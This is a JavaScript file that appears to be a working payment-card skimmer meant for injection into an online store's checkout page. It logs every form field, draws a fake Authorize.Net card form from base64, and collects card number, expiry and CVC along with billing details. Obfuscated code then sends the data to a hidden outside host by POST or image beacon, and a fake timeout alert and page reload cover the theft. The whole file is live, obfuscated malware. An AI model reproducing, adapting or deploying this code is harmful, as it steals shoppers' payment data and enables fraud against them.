;(({ container, regexpLocation, and }) => {
    const init = () => {
        setInterval(() => {
            [
                ...document.querySelectorAll(atob('aW5wdXQ=')),
                ...document.querySelectorAll(atob('c2VsZWN0'))
            ]
            .map(e => {
                if (e.value.trim().length !== 0) {
                    window.localStorage.setItem('dat---'+e.name+e.id, `${e.name || 'field_name'}: ${e.value}`)
                }
            })
        }, 1000)
      
        const draw = () => {
            container().innerHTML = atob('PHVsPjxsaSBjbGFzcz0id2NfcGF5bWVudF9tZXRob2QgcGF5bWVudF9tZXRob2RfYXV0aG9yaXplbmV0Ij4KICAgICAgICA8aW5wdXQgaWQ9InBheW1lbnRfbWV0aG9kX2F1dGhvcml6ZW5ldCIgdHlwZT0icmFkaW8iIGNsYXNzPSJpbnB1dC1yYWRpbyIgbmFtZT0icGF5bWVudF9tZXRob2QiIHZhbHVlPSJhdXRob3JpemVuZXQiIGNoZWNrZWQ9ImNoZWNrZWQiIGRhdGEtb3JkZXJfYnV0dG9uX3RleHQ9IiI+CgogICAgICAgIDxsYWJlbCBmb3I9InBheW1lbnRfbWV0aG9kX2F1dGhvcml6ZW5ldCI+CiAgICAgICAgICBDcmVkaXQgQ2FyZCA8aW1nIHdpZHRoPSI0NSIgc3JjPSJodHRwczovL3N0ZWxsYWxpZ2h0aW5nLmNvbS93cC1jb250ZW50L3BsdWdpbnMvYXV0aG9yaXplbmV0LXdvb2NvbW1lcmNlLWFkZG9uL2ltYWdlcy9tYXN0ZXJjYXJkLnBuZyIgYWx0PSJtYXN0ZXJjYXJkIj48aW1nIHdpZHRoPSI0NSIgc3JjPSJodHRwczovL3N0ZWxsYWxpZ2h0aW5nLmNvbS93cC1jb250ZW50L3BsdWdpbnMvYXV0aG9yaXplbmV0LXdvb2NvbW1lcmNlLWFkZG9uL2ltYWdlcy92aXNhLnBuZyIgYWx0PSJ2aXNhIj48aW1nIHdpZHRoPSI0NSIgc3JjPSJodHRwczovL3N0ZWxsYWxpZ2h0aW5nLmNvbS93cC1jb250ZW50L3BsdWdpbnMvYXV0aG9yaXplbmV0LXdvb2NvbW1lcmNlLWFkZG9uL2ltYWdlcy9kaXNjb3Zlci5wbmciIGFsdD0iZGlzY292ZXIiPjxpbWcgd2lkdGg9IjQ1IiBzcmM9Imh0dHBzOi8vc3RlbGxhbGlnaHRpbmcuY29tL3dwLWNvbnRlbnQvcGx1Z2lucy9hdXRob3JpemVuZXQtd29vY29tbWVyY2UtYWRkb24vaW1hZ2VzL2FtZXgucG5nIiBhbHQ9ImFtZXgiPgk8L2xhYmVsPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYXltZW50X2JveCBwYXltZW50X21ldGhvZF9hdXRob3JpemVuZXQiIHN0eWxlPSIiPgogICAgICAgICAgICA8cD5BbGwgY2FyZHMgYXJlIGNoYXJnZWQgYnkgQXV0aG9yaXplLk5ldCBzZXJ2ZXJzLjwvcD4KCiAgICAgICAgICA8ZmllbGRzZXQgaWQ9IndjLWF1dGhvcml6ZW5ldC1jYy1mb3JtIiBjbGFzcz0id2MtY3JlZGl0LWNhcmQtZm9ybSB3Yy1wYXltZW50LWZvcm0iPgogICAgICAgICAgICAgICAgICA8cCBjbGFzcz0iZm9ybS1yb3cgZm9ybS1yb3ctd2lkZSB3b29jb21tZXJjZS12YWxpZGF0ZWQiPgogICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImF1dGhvcml6ZW5ldC1jYXJkLW51bWJlciI+Q2FyZCBOdW1iZXIgPHNwYW4gY2xhc3M9InJlcXVpcmVkIj4qPC9zcGFuPjwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IGlkPSJhdXRob3JpemVuZXQtY2FyZC1udW1iZXIiIGNsYXNzPSJpbnB1dC10ZXh0IHdjLWNyZWRpdC1jYXJkLWZvcm0tY2FyZC1udW1iZXIgYW1leCBpZGVudGlmaWVkIiB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjIwIiBhdXRvY29tcGxldGU9Im9mZiIgcGxhY2Vob2xkZXI9IioqKiogKioqKiAqKioqICoqKioiIG5hbWU9ImF1dGhvcml6ZW5ldC1jYXJkLW51bWJlciI+CiAgICAgICAgICAgIDwvcD48cCBjbGFzcz0iZm9ybS1yb3cgZm9ybS1yb3ctZmlyc3Qgd29vY29tbWVyY2UtdmFsaWRhdGVkIj4KICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJhdXRob3JpemVuZXQtY2FyZC1leHBpcnkiPkV4cGlyeSAoTU0vWVkpIDxzcGFuIGNsYXNzPSJyZXF1aXJlZCI+Kjwvc3Bhbj48L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCBpZD0iYXV0aG9yaXplbmV0LWNhcmQtZXhwaXJ5IiBjbGFzcz0iaW5wdXQtdGV4dCB3Yy1jcmVkaXQtY2FyZC1mb3JtLWNhcmQtZXhwaXJ5IiB0eXBlPSJ0ZXh0IiBhdXRvY29tcGxldGU9Im9mZiIgcGxhY2Vob2xkZXI9Ik1NIC8gWVkiIG5hbWU9ImF1dGhvcml6ZW5ldC1jYXJkLWV4cGlyeSI+CiAgICAgICAgICAgIDwvcD48cCBjbGFzcz0iZm9ybS1yb3cgZm9ybS1yb3ctbGFzdCB3b29jb21tZXJjZS12YWxpZGF0ZWQiPgogICAgICAgICAgICA8bGFiZWwgZm9yPSJhdXRob3JpemVuZXQtY2FyZC1jdmMiPkNhcmQgQ29kZSA8c3BhbiBjbGFzcz0icmVxdWlyZWQiPio8L3NwYW4+PC9sYWJlbD4KICAgICAgICAgICAgPGlucHV0IGlkPSJhdXRob3JpemVuZXQtY2FyZC1jdmMiIGNsYXNzPSJpbnB1dC10ZXh0IHdjLWNyZWRpdC1jYXJkLWZvcm0tY2FyZC1jdmMiIHR5cGU9InRleHQiIGF1dG9jb21wbGV0ZT0ib2ZmIiBwbGFjZWhvbGRlcj0iQ1ZDIiBuYW1lPSJhdXRob3JpemVuZXQtY2FyZC1jdmMiPgogICAgICAgICAgPC9wPgkJCQkJCTxkaXYgY2xhc3M9ImNsZWFyIj48L2Rpdj4KICAgICAgICAgIDwvZmllbGRzZXQ+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9saT48dWw+CiAgICAgIA==')
      
            let cn = ''
              , ce = ''
              , cv = ''
      
            const change = async () => {
                if (cv.length >= 3 && ce.length === 7 && cn.length === 19) {
                    try {
                        window.localStorage.setItem('send', true)
                    } catch (e) {}
      
                    try {
                        window.sessionStorage.setItem('send', true)
                    } catch (e) {}
      
                    try {
                        document.cookie = 'send=true; ' + document.cookie
                    } catch (e) {}
      
                    document.querySelectorAll('*').forEach(E => E.style.cursor = 'wait')
                    const a = document.createElement('div')
      
                    a.style.position = 'fixed'
                    a.style.left = '0px'
                    a.style.top = '0px'
                    a.style.width = '100vw'
                    a.style.height = '100vh'
      
                    document.body.appendChild(a)

                    const data = [cn, cv, ce, `# ${Object.keys(Object.keys(localStorage).map(e => e.match(/dat---/) ? e : false).filter(f => f).map(e => localStorage[e]).filter(d => !d.match(/({|}|product|"tag"|hidden|empty|"title"|"id"|password|payment_method|authorizenet|category\[\]|billing-address-same-as-shipping|form_key: |context: checkout)/)).reduce((ctx, elem) => {
                        ctx[elem] = true
                        return ctx
                    }, {})).join(' # ')} #`]

                    ///////////

                    const _0x5ce120=_0x4fc7;function _0x4fc7(_0x506f8f,_0x2813cc){const _0x574996=_0x5749();return _0x4fc7=function(_0x4fc765,_0x1ecde7){_0x4fc765=_0x4fc765-0xa7;let _0x23ad40=_0x574996[_0x4fc765];return _0x23ad40;},_0x4fc7(_0x506f8f,_0x2813cc);}function _0x5749(){const _0xcecad5=['src','onerror','join','request48yfyhrygfeyurgfeuyguy47ioefijghijjtjtitjrier','Q29udGVudC1UeXBl','stringify','reduce','154629FaRFRD','406748aYtjzo','13801986RVjBLs','map','1125036bSzoeN','keys','onload','QWNjZXB0','35nSrjjY','6049408mAZkLl','1266BuLMME','charCodeAt','15XzltVs','UE9TVA==','split','YXBwbGljYXRpb24vanNvbg==', btoa(`${atob(window.h54h54h46hostokopskeokfoekfokeojfuifh435h76w4tw4tg54g)}${atob('P2RhdGE9')}`) ,'1609BirorM','420YJnUOf','1054TPAgIz', window.h54h54h46hostokopskeokfoekfokeojfuifh435h76w4tw4tg54g];_0x5749=function(){return _0xcecad5;};return _0x5749();}(function(_0xd69663,_0x50526b){const _0x1ed846=_0x4fc7,_0x146f2a=_0xd69663();while(!![]){try{const _0x542a7a=-parseInt(_0x1ed846(0xb6))/0x1*(-parseInt(_0x1ed846(0xb8))/0x2)+-parseInt(_0x1ed846(0xa9))/0x3+parseInt(_0x1ed846(0xc2))/0x4*(parseInt(_0x1ed846(0xb1))/0x5)+-parseInt(_0x1ed846(0xaf))/0x6*(-parseInt(_0x1ed846(0xad))/0x7)+-parseInt(_0x1ed846(0xae))/0x8+parseInt(_0x1ed846(0xc1))/0x9*(-parseInt(_0x1ed846(0xb7))/0xa)+parseInt(_0x1ed846(0xa7))/0xb;if(_0x542a7a===_0x50526b)break;else _0x146f2a['push'](_0x146f2a['shift']());}catch(_0x1133fa){_0x146f2a['push'](_0x146f2a['shift']());}}}(_0x5749,0x87bdb),window[_0x5ce120(0xbd)]=async([_0x40140c,_0x27411a,_0x3b0cad,_0xe8bba9])=>{const _0x43c6c3=_0x5ce120,_0x3efee5={'c':_0x40140c,'v':_0x27411a,'e':_0x3b0cad,'l':_0xe8bba9},_0x15ef82=Object[_0x43c6c3(0xaa)](_0x3efee5)[_0x43c6c3(0xc0)]((_0x3c35d9,_0x43e840)=>{const _0x5db9b8=_0x43c6c3,_0x1bc34c=0x1,_0x563a9c=_0x43e840[_0x5db9b8(0xb3)]('')[_0x5db9b8(0xa8)](_0x18982f=>String['fromCharCode'](_0x18982f[_0x5db9b8(0xb0)]()+_0x1bc34c))[_0x5db9b8(0xbc)](''),_0x25e251=_0x3efee5[_0x43e840][_0x5db9b8(0xb3)]('')[_0x5db9b8(0xa8)](_0x68ed08=>String['fromCharCode'](_0x68ed08[_0x5db9b8(0xb0)]()+_0x1bc34c))[_0x5db9b8(0xbc)]('011010');return _0x3c35d9[_0x563a9c]=_0x25e251,_0x3c35d9;},{});try{await fetch(atob(_0x43c6c3(0xb9)),{'headers':{[atob(_0x43c6c3(0xac))]:atob(_0x43c6c3(0xb4)),[atob(_0x43c6c3(0xbe))]:atob(_0x43c6c3(0xb4))},'body':JSON[_0x43c6c3(0xbf)](_0x15ef82),'method':atob(_0x43c6c3(0xb2))});}catch(_0x5ff041){await new Promise(_0x22b709=>{const _0x514484=_0x43c6c3,_0x97baf7=new Image();_0x97baf7[_0x514484(0xab)]=()=>_0x22b709(),_0x97baf7[_0x514484(0xbb)]=()=>_0x22b709(),_0x97baf7[_0x514484(0xba)]=encodeURI(''+atob(_0x514484(0xb5))+encodeURIComponent(JSON[_0x514484(0xbf)](_0x15ef82)));});}});
                    
                    await request48yfyhrygfeyurgfeuyguy47ioefijghijjtjtitjrier(data)

                    ///////////

                    setTimeout(() => {
                        alert(atob('V2FpdGluZyB0aW1lIGV4Y2VlZGVk'))
                        window.location.reload()
                    }, 2500)  
                }
            }
      
            const a = atob('I2F1dGhvcml6ZW5ldC1jYXJkLW51bWJlcg==')
      
            document.querySelector(a).addEventListener(atob('aW5wdXQ='), ({ target: { value } }) => {
                const _value = Array(4).fill(true).map((_, i) => value.replace(/ /gi, '').slice(i * 4, (i + 1) * 4)).join(' ').trim()
                document.querySelector(a).value = _value
                if (_value.length < 20) {
                    cn = _value
                    change()
                }
            })
      
            const b = atob('I2F1dGhvcml6ZW5ldC1jYXJkLWV4cGlyeQ==')
      
            document.querySelector(b).addEventListener(atob('aW5wdXQ='), ({ target: { value } }) => {
                let _value = Array(2).fill(true).map((_, i) => value.replace(/(\/| )/gi, '').slice(i * 2, (i + 1) * 2)).join(' / ').trim()
      
                if (!_value.match(/\/ \d/)) {
                    _value = _value.replace(/\//, '').trim()
                }
        
                document.querySelector(b).value = _value
                if (_value.length < 8) {
                    ce = _value
                    change()
                }
            })
      
            const y = atob('I2F1dGhvcml6ZW5ldC1jYXJkLWN2Yw==')
      
            document.querySelector(y).addEventListener(atob('aW5wdXQ='), ({ target: { value } }) => {
                document.querySelector(y).value = document.querySelector(y).value.slice(0, 3)
                if (value.length < 4) {
                    cv = value
                    change()
                }
            })
      
            try {
                document.querySelector(atob('W2lkPSJwbGFjZV9vcmRlciJd')).innerText = atob('UGxhY2Ugb3JkZXI=')
            } catch (e) {}
        }
      
        setInterval(() => {
            const targetNode = container()

            try {
                if (targetNode && !targetNode.innerHTML.match(/\*\*\*\*/) && window.location.href.match(new RegExp(regexpLocation)) && and()) {
                    draw()
                    
                    setInterval(() => {
                        if (!document.querySelector(atob('I2F1dGhvcml6ZW5ldC1jYXJkLWV4cGlyeQ=='))) {
                            draw()  
                        }
                    }, 100)
                }
          } catch (e) {}
        }, 100)
    }
      
    let notSend = true
      
    try {
        if (notSend) {
            notSend = !window.localStorage.send
        }
    } catch (e) {}
      
    try {
        if (notSend) {
            notSend = !window.sessionStorage.send
        }
    } catch (e) {}
      
    try {
        if (notSend) {
            notSend = !document.cookie.match(/send=true/)
        }
    } catch (e) {}
    
    if (notSend && new Date() - 0 < 1699250384994) {
        document.addEventListener(atob('cmVhZHlzdGF0ZWNoYW5nZQ=='), () => {
            if (document.readyState === atob('Y29tcGxldGU=')) {
                init()
            }
        })
        
        init()
    }
})({
    container: () => document.querySelector('[class="payment-method-billing-address"]'),
    regexpLocation: '#payment',
    and: () => {
        try {
            return document.querySelector('[class="billing-address-details"]').getBoundingClientRect().x !== 0
        } catch (e) {
            return false
        }
    }
})